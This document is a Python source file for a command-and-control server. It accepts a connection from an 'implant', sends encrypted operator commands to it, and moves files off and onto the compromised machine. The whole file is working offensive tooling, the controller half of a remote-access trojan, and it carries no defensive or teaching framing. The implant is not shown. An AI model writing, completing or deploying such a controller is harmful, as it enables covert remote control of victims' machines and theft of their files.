# Filename: c2_server.py

import socket
from cryptography.fernet import Fernet

ENCRYPTION_KEY = b'PASTE_YOUR_GENERATED_KEY_HERE=' 
cipher = Fernet(ENCRYPTION_KEY)

HOST = '0.0.0.0'
PORT = 4444

def send_encrypted(sock, data):
    encrypted_data = cipher.encrypt(data.encode())
    sock.send(encrypted_data)

def recv_encrypted(sock, buffer_size=4096):
    encrypted_data = sock.recv(buffer_size)
    decrypted_data = cipher.decrypt(encrypted_data).decode()
    return decrypted_data

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    
    print(f"[*] C2 Server listening on {HOST}:{PORT}")
    
    client_socket, client_address = server_socket.accept()
    print(f"[+] Implant connected from: {client_address[0]}:{client_address[1]}")
    
    while True:
        try:
            cmd = input("C2> ")
            if not cmd: continue
            
            send_encrypted(client_socket, cmd)

            if cmd.lower() == 'exit':
                break
            
            if cmd.startswith("download"):
                file_data_encrypted = client_socket.recv(1024 * 1024)
                file_data = cipher.decrypt(file_data_encrypted)
                _, remote_path, local_path = cmd.split()
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                print(f"File downloaded to {local_path}")
                continue

            if cmd.startswith("upload"):
                _, local_path, remote_path = cmd.split()
                with open(local_path, 'rb') as f:
                    file_data = f.read()
                encrypted_file = cipher.encrypt(file_data)
                client_socket.send(encrypted_file)
                print("File uploaded.")
                continue

            response = recv_encrypted(client_socket)
            print(response)

        except Exception as e:
            print(f"[-] Error: {e}")
            break
            
    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    main()
